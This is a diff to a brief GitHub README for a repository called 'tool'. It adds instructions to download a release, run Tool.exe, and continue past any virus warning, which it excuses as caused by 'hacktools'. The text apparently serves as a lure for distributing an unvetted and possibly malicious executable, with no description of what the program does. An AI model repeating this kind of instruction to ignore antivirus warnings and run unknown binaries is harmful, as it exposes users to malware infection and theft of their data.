@@ -1,8 +1,8 @@
 # tool
 
-[**DOWNLOAD!**](https://github.com/Downloaddecke/tool/releases/tag/schuhtool)
-
-
+Download here -> [**DOWNLOAD!**](https://github.com/Downloaddecke/tool/releases/tag/schuhtool)
+After clicking on download go on Tool.exe 
+(if it says virus continue it its bc of hacktools)
 
 ![image](https://github.com/user-attachments/assets/c3dfb2dd-7d50-4d48-8064-1cd8ae85dd7a)
 
